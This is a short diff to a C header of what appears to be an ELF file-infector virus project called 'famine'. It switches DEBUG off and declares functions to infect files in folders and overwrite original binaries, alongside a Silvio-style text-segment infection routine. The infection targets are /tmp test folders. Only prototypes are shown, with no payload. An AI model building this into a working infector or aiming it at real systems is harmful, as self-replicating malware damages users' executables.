@@ -86,7 +86,7 @@ enum e_error
     NB_OF_ERROR_CODES /* Always keep last */
 };
 
-#define DEBUG true
+#define DEBUG false
 
 #define FOLDER_TO_INFECT_ONE "/tmp/test/"
 #define FOLDER_TO_INFECT_TWO "/tmp/test2/"
@@ -179,6 +179,10 @@ int check_elf_header(t_famine *famine);
 void set_string_table_ptr(t_famine *famine);
 
 void apply_infection(t_famine *famine);
+int infect_file_in_folder(const char *path);
+int get_binary_data(char *file_name, t_famine *famine);
+void overwrite_original_binary(t_famine *famine);
+
 void silvio_text_infection(t_famine *famine);
 
 size_t find_keysection_offset_elf64(t_famine *famine);
